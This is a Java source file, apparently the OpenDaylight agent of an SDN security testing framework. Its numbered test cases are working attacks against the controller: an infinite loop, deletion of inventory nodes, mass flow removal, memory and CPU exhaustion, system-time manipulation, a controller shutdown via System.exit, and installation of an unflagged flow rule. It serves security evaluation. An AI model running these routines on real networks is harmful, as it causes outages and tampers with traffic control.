/**
 * Copyright (c) 2013 Cisco Systems, Inc. and others.  All rights reserved.
 * <p>
 * This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License v1.0 which accompanies this distribution,
 * and is available at http://www.eclipse.org/legal/epl-v10.html
 */
package org.deltaproject.odlagent.core;

import org.deltaproject.odlagent.tests.CPUex;
import com.google.common.base.Optional;
import com.google.common.util.concurrent.CheckedFuture;
import org.deltaproject.odlagent.tests.SystemTimeSet;
import org.deltaproject.odlagent.utils.InstanceIdentifierUtils;
import org.deltaproject.odlagent.utils.InventoryUtils;
import org.deltaproject.odlagent.utils.PacketUtils;
import org.deltaproject.odlagent.utils.TestProviderTransactionUtil;
import org.opendaylight.controller.md.sal.binding.api.*;
import org.opendaylight.controller.md.sal.common.api.data.AsyncDataChangeEvent;
import org.opendaylight.controller.md.sal.common.api.data.LogicalDatastoreType;
import org.opendaylight.controller.md.sal.common.api.data.TransactionCommitFailedException;
import org.opendaylight.controller.sal.binding.api.NotificationService;
import org.opendaylight.yang.gen.v1.urn.ietf.params.xml.ns.yang.ietf.inet.types.rev130715.Uri;
import org.opendaylight.yang.gen.v1.urn.ietf.params.xml.ns.yang.ietf.yang.types.rev130715.MacAddress;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.FlowCapableNode;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.FlowId;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.Table;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.TableKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.Flow;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.FlowBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.inventory.rev130819.tables.table.FlowKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.AddFlowInputBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.FlowTableRef;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.RemoveFlowInputBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.SalFlowService;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.statistics.rev130819.FlowStatisticsData;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.flow.Match;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.types.rev131026.flow.MatchBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.*;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.node.NodeConnectorKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.nodes.Node;
import org.opendaylight.yang.gen.v1.urn.opendaylight.inventory.rev130819.nodes.NodeKey;
import org.opendaylight.yang.gen.v1.urn.opendaylight.l2.types.rev130827.EtherType;
import org.opendaylight.yang.gen.v1.urn.opendaylight.model.match.types.rev131026.ethernet.match.fields.EthernetTypeBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.model.match.types.rev131026.match.EthernetMatchBuilder;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingListener;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingService;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketReceived;
import org.opendaylight.yangtools.concepts.ListenerRegistration;
import org.opendaylight.yangtools.concepts.Registration;
import org.opendaylight.yangtools.yang.binding.DataObject;
import org.opendaylight.yangtools.yang.binding.InstanceIdentifier;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.nio.ByteBuffer;
import java.util.*;

/**
 * AppAgentImpl
 */
public class AppAgentImpl implements PacketProcessingListener, DataChangeListener {

    private static final Logger LOG = LoggerFactory.getLogger(AppAgentImpl.class);
    private static final byte[] ETH_TYPE_IPV4 = new byte[]{0x08, 0x00};

    private NotificationService notificationService;

    private PacketProcessingService packetProcessingService;
    private DataBroker dataBroker;
    private Registration packetInRegistration;
    private SalFlowService salFlowService;
    private ListenerRegistration<DataChangeListener> dataChangeListenerRegistration;

    private ArrayList<NodeId> nodeIdList;
    private Set<InstanceIdentifier<Node>> nodeIdentifierSet;
    private Map<String, InstanceIdentifier<Table>> node2table;
    private Map<MacAddress, NodeConnectorRef> mac2portMapping;

    private Interface cm;

    private boolean isDrop;
    private boolean isLoop;

    /**
     * @param notificationService the notificationService to set
     */
    // @Override
    public void setNotificationService(NotificationService notificationService) {
        this.notificationService = notificationService;
    }

    /**
     * @param packetProcessingService the packetProcessingService to set
     */
    // @Override
    public void setPacketProcessingService(
            PacketProcessingService packetProcessingService) {
        this.packetProcessingService = packetProcessingService;
    }

    /**
     * @param data the data to set
     */
    // @Override
    public void setDataBroker(DataBroker data) {
        this.dataBroker = data;
    }

    public void setSalFlowService(SalFlowService sal) {
        this.salFlowService = sal;
    }

    /**
     * start
     */
    //@Override
    public void start() {
        LOG.info("[App-Agent] start() passing");

        nodeIdList = new ArrayList<>();
        node2table = new HashMap<>();
        mac2portMapping = new HashMap<>();
        nodeIdentifierSet = new HashSet<>();

        packetInRegistration = notificationService.registerNotificationListener(this);
        dataChangeListenerRegistration = dataBroker.registerDataChangeListener(LogicalDatastoreType.OPERATIONAL,
                InstanceIdentifier.builder(Nodes.class)
                        .child(Node.class)
                        .augmentation(FlowCapableNode.class)
                        .child(Table.class).build(),
                this,
                DataBroker.DataChangeScope.SUBTREE);

        //appAgentHandler.connectManager();
    }

    /**
     * stop
     */
    // @Override
    public void stop() {
        LOG.info("stop() -->");
        //TODO: remove flow (created in #start())
        try {
            packetInRegistration.close();
        } catch (Exception e) {
            LOG.warn("Error unregistering packet in listener: {}", e.getMessage());
            LOG.debug("Error unregistering packet in listener.. ", e);
        }
        try {
            dataChangeListenerRegistration.close();
        } catch (Exception e) {
            LOG.warn("Error unregistering data change listener: {}", e.getMessage());
            LOG.debug("Error unregistering data change listener.. ", e);
        }
        LOG.info("stop() <--");
    }

    public CheckedFuture<Void, TransactionCommitFailedException> writeFlowToConfig(InstanceIdentifier<Flow> flowPath, Flow flowBody) {
        ReadWriteTransaction addFlowTransaction = dataBroker.newReadWriteTransaction();
        addFlowTransaction.put(LogicalDatastoreType.CONFIGURATION, flowPath, flowBody, true);
        return addFlowTransaction.submit();
    }

    @Override
    public void onDataChanged(AsyncDataChangeEvent<InstanceIdentifier<?>, DataObject> change) {
        Short requiredTableId = 0;

        // TODO add flow
        Map<InstanceIdentifier<?>, DataObject> updated = change.getUpdatedData();

        for (Map.Entry<InstanceIdentifier<?>, DataObject> updateItem : updated.entrySet()) {
            DataObject object = updateItem.getValue();

            if (object instanceof Table) {
                Table tableSure = (Table) object;
                LOG.info("[App-Agent] table: {}", object);

                if (requiredTableId.equals(tableSure.getId())) {
                    @SuppressWarnings("unchecked")
                    InstanceIdentifier<Table> tablePath = (InstanceIdentifier<Table>) updateItem.getKey();
                    LOG.info("[App-Agent] onSwitchAppeared " + tablePath.toString());

                    /*
                     * appearedTablePath is in form of /nodes/node/node-id/table/table-id
                     * so we shorten it to /nodes/node/node-id to get identifier of switch.
                     */
                    InstanceIdentifier<Node> nodePath = InstanceIdentifierUtils.getNodePath(tablePath);
                    //packetInDispatcher.getHandlerMapping().put(nodePath, this);
                    nodeIdentifierSet.add(nodePath);

                    NodeId nodeId = nodePath.firstKeyOf(Node.class, NodeKey.class).getId();
                    nodeIdList.add(nodeId);

                    String tempstr = tablePath.toString();
                    String swid = tempstr.substring(tempstr.indexOf("openflow"), tempstr.indexOf("openflow") + 10);
                    node2table.put(swid, tablePath);
                }
            }
        }
    }

    @Override
    public void onPacketReceived(PacketReceived notification) {
        LOG.info("[App-Agent] onPacketReceived() " + notification.toString());

        /**
         * Notification contains reference to ingress port
         * in a form of path in inventory: /nodes/node/node-connector
         *
         * In order to get path we shorten path to the first node reference
         * by using firstIdentifierOf helper method provided by InstanceIdentifier,
         * this will effectively shorten the path to /nodes/node.
         *
         */
        InstanceIdentifier<?> ingressPort = notification.getIngress().getValue();
        InstanceIdentifier<Node> nodeOfPacket = ingressPort.firstIdentifierOf(Node.class);

        // read src MAC and dst MAC
        byte[] dstMacRaw = PacketUtils.extractDstMac(notification.getPayload());
        byte[] srcMacRaw = PacketUtils.extractSrcMac(notification.getPayload());
        byte[] etherType = PacketUtils.extractEtherType(notification.getPayload());

        if (Arrays.equals(ETH_TYPE_IPV4, etherType)) {
            MacAddress dstMac = PacketUtils.rawMacToMac(dstMacRaw);
            String dstMacStr = PacketUtils.rawMacToString(dstMacRaw);
            MacAddress srcMac = PacketUtils.rawMacToMac(srcMacRaw);

            NodeConnectorKey ingressKey = InstanceIdentifierUtils.getNodeConnectorKey(notification.getIngress().getValue());
            NodeConnectorId connectorId = ingressKey.getId();

            LOG.info("[App-Agent] " + connectorId.getValue());
            LOG.info("[App-Agent] Received packet from MAC match: {}, ingress: {}", srcMac, ingressKey.getId());
            LOG.info("[App-Agent] Received packet to   MAC match: {}", dstMac);
            LOG.info("[App-Agent] Ethertype: {}", Integer.toHexString(0x0000ffff & ByteBuffer.wrap(etherType).getShort()));

            mac2portMapping.put(srcMac, notification.getIngress());
            NodeConnectorRef destNodeConnector = mac2portMapping.get(dstMac);

            if (destNodeConnector != null && !destNodeConnector.equals(notification.getIngress())) {
                // LOG.info(connectorId.toString() + "->" + destNodeConnector);
                InstanceIdentifier<Table> tablePath = null;
                for (String key : node2table.keySet()) {
                    if (connectorId.toString().contains(key)) {
                        tablePath = node2table.get(key);
                    }
                }

                //NodeId ingressNodeId = InventoryUtils.getNodeId(notification.getIngress());
                //FlowUtils.programL2Flow(dataBroker, ingressNodeId, dstMacStr, connectorId, InventoryUtils.getNodeConnectorId(destNodeConnector));
            }
        }
    }


    public void setControlMessageDrop() {
        this.isDrop = true;
    }

    public void setInfiniteLoop() {
        this.isLoop = true;
    }

    public void sendTempPkt() {

    }

    /*
     * 3.1.030: Infinite Loops
     */
    public void testInfiniteLoop() {
        int i = 0;
        LOG.info("[App-Agent] Infinite Loop");

        while (true) {
            i++;

            if (i == 10)
                i = 0;
        }
    }

    /*
     * 3.1.040: Internal Storage Abuse
     */
    public String testInternalStorageAbuse() {
        LOG.info("[App-Agent] Internal Storage Abuse");
        String removed = "";

        for (InstanceIdentifier<Node> node : nodeIdentifierSet) {
            WriteTransaction wt = dataBroker.newWriteOnlyTransaction();
            wt.delete(LogicalDatastoreType.OPERATIONAL, node);
            CheckedFuture<Void, TransactionCommitFailedException> commitFuture = wt.submit();

            try {
                commitFuture.checkedGet();
                LOG.info("[App-Agent] Transaction success for REMOVE of object {}", node);
                removed += node.toString() + ", ";
            } catch (TransactionCommitFailedException e) {
                e.printStackTrace();
            }
        }

        return removed;
    }

    /*
     * 3.1.070: Flow Rule Modification
     */
    public String testFlowRuleModification() {
        LOG.info("[App-Agent] Flow Rule Modification!");

        String modified = "null";

        int flowCount = 0;
        int flowStatsCount = 0;

        for (NodeId nodeId : nodeIdList) {
            NodeKey nodeKey = new NodeKey(nodeId);

            InstanceIdentifier<FlowCapableNode> nodeRef = InstanceIdentifier
                    .create(Nodes.class).child(Node.class, nodeKey)
                    .augmentation(FlowCapableNode.class);

            ReadOnlyTransaction readOnlyTransaction = dataBroker.newReadOnlyTransaction();
            FlowCapableNode node = TestProviderTransactionUtil.getDataObject(
                    readOnlyTransaction, nodeRef);

            if (node != null) {
                List<Table> tables = node.getTable();

                for (Iterator<Table> iterator2 = tables.iterator(); iterator2.hasNext(); ) {
                    TableKey tableKey = iterator2.next().getKey();
                    InstanceIdentifier<Table> tableRef = InstanceIdentifier
                            .create(Nodes.class).child(Node.class, nodeKey)
                            .augmentation(FlowCapableNode.class).child(Table.class, tableKey);
                    Table table = TestProviderTransactionUtil.getDataObject(
                            readOnlyTransaction, tableRef);

                    if (table != null) {
                        if (table.getFlow() != null) {
                            List<Flow> flows = table.getFlow();
                            // LOG.info("[App-Agent] Flowsize : " + flows.size());

                            for (Flow flow1 : flows) {
                                flowCount++;
                                FlowKey flowKey = flow1.getKey();
                                InstanceIdentifier<Flow> flowRef = InstanceIdentifier
                                        .create(Nodes.class).child(Node.class, nodeKey)
                                        .augmentation(FlowCapableNode.class).child(Table.class, tableKey)
                                        .child(Flow.class, flowKey);

                                Flow flow = TestProviderTransactionUtil.getDataObject(
                                        readOnlyTransaction, flowRef);

                                if (flow != null) {
                                    modified = flow.toString() + "\n";
                                    FlowStatisticsData data = flow
                                            .getAugmentation(FlowStatisticsData.class);
                                    if (null != data) {
                                        flowStatsCount++;
                                        // LOG.info("[App-Agent] Flow 2 : " + data.toString());
                                    }
                                }

                            }
                        }
                    }
                }
            }
        }

        if (flowCount == flowStatsCount) {
            LOG.info("flowStats - Success");
        } else {
            LOG.info("flowStats - Failed");
        }

        return modified;
    }

    /*
     * 3.1.080: Flow Table Clearance
     */
    public String testFlowTableClearance(boolean infinite) {
        LOG.info("[App-Agent] Flow Table Clearance");

        String modified = "";

        int cnt = 0;

        while (cnt != 100) {
            for (NodeId id : nodeIdList) {
                RemoveFlowInputBuilder flowBuilder = new RemoveFlowInputBuilder()
                        .setBarrier(false)
                        .setNode(InventoryUtils.getNodeRef(id));

                if (salFlowService == null)
                    LOG.info("salFlowService is NULL");
                else
                    salFlowService.removeFlow(flowBuilder.build());
            }
            cnt++;

            if (!infinite)
                break;
        }

        return modified;
    }

    /*
     * 3.1.110: Memory Exhaustion
     */
    public void testResourceExhaustionMem() {
        LOG.info("[App-Agent] Resource Exhausion : Mem");

        ArrayList<long[][]> arry;
        arry = new ArrayList<long[][]>();

        while (true) {
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
        }
    }

    /*
     * 3.1.120: CPU Exhaustion
     */
    public void testResourceExhaustionCPU() {
        LOG.info("[App-Agent] Resource Exhausion : CPU");
        int thread_count = 0;

        for (int count = 0; count < 1000; count++) {
            CPUex cpu_thread = new CPUex();
            cpu_thread.start();
            thread_count++;

            LOG.info("[AppAgent] Resource Exhausion : Thread "
                    + thread_count);
        }
    }

    /*
     * 3.1.130: System Variable Manipulation
     */
    public boolean testSystemVariableManipulation() {
        LOG.info("[App-Agent] System Variable Manipulation");

        SystemTimeSet systime = new SystemTimeSet();
        systime.start();
        return true;
    }

    /*
     * 3.1.140: System Command Execution
     */
    public void testSystemCommandExecution() {
        LOG.info("[AppAgent] System Command Execution : EXIT Controller");
        System.exit(0);
    }

    /*
     * 2.1.060:
     */
    public String sendUnFlaggedFlowRemoveMsg(String cmd, long ruleId) {

        LOG.info("[App Agent] Call sendUnflaggedFlowRemoveMsg");

        ReadOnlyTransaction readOnlyTransaction = null;
        try {
            Nodes nodes = null;
            InstanceIdentifier.InstanceIdentifierBuilder<Nodes> nodesInsIdBuilder = InstanceIdentifier
                    .builder(Nodes.class);
            readOnlyTransaction = dataBroker.newReadOnlyTransaction();
            Optional<Nodes> dataObjectOptional = null;
            dataObjectOptional = readOnlyTransaction
                    .read(LogicalDatastoreType.OPERATIONAL, nodesInsIdBuilder.build()).get();
            if (dataObjectOptional.isPresent()) {
                nodes = dataObjectOptional.get();
            }

            readOnlyTransaction.close();

            assert nodes != null;
            NodeKey nodeKey = new NodeKey(nodes.getNode().get(0).getId());

            InstanceIdentifier<FlowCapableNode> nodeRef = InstanceIdentifier
                    .create(Nodes.class).child(Node.class, nodeKey)
                    .augmentation(FlowCapableNode.class);

            readOnlyTransaction = dataBroker.newReadOnlyTransaction();
            FlowCapableNode flowCapableNode = TestProviderTransactionUtil.getDataObject(
                    readOnlyTransaction, nodeRef);
            readOnlyTransaction.close();

            assert flowCapableNode != null;
            Table table = flowCapableNode.getTable().get(0);

            if (cmd.contains("install")) {

                FlowBuilder flowBuilder = new FlowBuilder()
                        .setTableId(table.getId())
                        .setFlowName("unflagged");

                Match match = new MatchBuilder()
                        .setInPort(NodeConnectorId.getDefaultInstance("1"))
                        .setEthernetMatch(
                                new EthernetMatchBuilder().setEthernetType(
                                        new EthernetTypeBuilder().setType(
                                                new EtherType(2048L))
                                                .build())
                                        .build())
                        .build();
                Flow flow = flowBuilder
                        .setId(new FlowId(Long.toString(flowBuilder.hashCode())))
                        .setPriority(555)
                        .setMatch(match)
                        .build();

                InstanceIdentifier<Node> nodeInstanceId = InstanceIdentifier.builder(Nodes.class)
                        .child(Node.class, nodeKey).build();
                InstanceIdentifier<Table> tableInstanceId = nodeInstanceId
                        .augmentation(FlowCapableNode.class)
                        .child(Table.class, new TableKey(table.getId()));

                final AddFlowInputBuilder builder = new AddFlowInputBuilder(flow).setNode(new NodeRef(nodeInstanceId))
                        .setFlowTable(new FlowTableRef(tableInstanceId))
                        .setTransactionUri(new Uri("9999"));

                salFlowService.addFlow(builder.build());

                LOG.info("Install a flow {} to the device {}", flow, nodeKey.getId());
                String result = "Installed flow rule id|" + flow.getId().getValue();

                return result;

            } else if (cmd.contains("check")) {

                Boolean result = true;

                for (Flow flow : table.getFlow()) {
                    if (Long.parseLong(flow.getId().getValue()) == ruleId) {
                        result = false;
                    }
                }

                if (result) {
                    return "success";
                } else {
                    return "fail";
                }
            }
        } catch (Exception e) {
            LOG.error(e.toString());
        }

        return "fail";
    }
}